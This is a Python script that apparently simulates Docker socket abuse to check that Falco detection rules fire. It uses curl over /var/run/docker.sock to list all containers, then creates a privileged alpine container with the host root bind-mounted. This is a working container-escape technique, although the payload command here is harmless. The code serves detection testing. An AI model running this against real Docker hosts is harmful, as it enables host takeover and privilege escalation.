import json
import subprocess
import requests_unixsocket

SOCK_BASE = "http+unix://%2Fvar%2Frun%2Fdocker.sock"
SOCK_PATH = "/var/run/docker.sock"


def run_attack() -> None:
    print("[SOCK] Docker Socket Abuse Simulation")

    # Step 1: enumerate containers via curl — proc.name=curl triggers the Falco rule
    # (curl --unix-socket is the most common real-world docker.sock recon technique)
    print("[SOCK] Enumerating containers via curl --unix-socket ...")
    result = subprocess.run(
        ["curl", "-s", "--unix-socket", SOCK_PATH, "http://localhost/containers/json?all=true"],
        capture_output=True, text=True, timeout=10
    )
    try:
        containers = json.loads(result.stdout)
        for c in containers:
            print(f"[SOCK][!] Container: {c.get('Names')} | Image: {c.get('Image')} | State: {c.get('State')}")
    except json.JSONDecodeError:
        print(f"[SOCK] raw response: {result.stdout[:200]}")

    # Step 2: spawn a privileged container with host root bind-mounted
    print("[SOCK] Attempting to create privileged sibling container with host mount...")
    payload = json.dumps({
        "Image": "alpine",
        "Cmd": ["sh", "-c", "hostname && cat /host/etc/hostname 2>/dev/null || echo 'host mount ok'"],
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
        },
        "Labels": {"spawned_by": "attacker-sock", "scenario": "docker-socket-abuse"},
    })

    result = subprocess.run(
        [
            "curl", "-s", "--unix-socket", SOCK_PATH,
            "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", payload,
            "http://localhost/containers/create?name=attacker-spawned",
        ],
        capture_output=True, text=True, timeout=10
    )

    try:
        resp_json = json.loads(result.stdout)
        if "Id" in resp_json:
            print(f"[SOCK][!] SUCCESS: Privileged container created via docker.sock (id={resp_json['Id'][:12]})")
        elif "message" in resp_json:
            print(f"[SOCK] Docker response: {resp_json['message'][:200]}")
        else:
            print(f"[SOCK] Response: {result.stdout[:200]}")
    except json.JSONDecodeError:
        print(f"[SOCK] raw response: {result.stdout[:200]}")

    print("[SOCK] Attack simulation complete — Falco should have fired on curl docker.sock access")
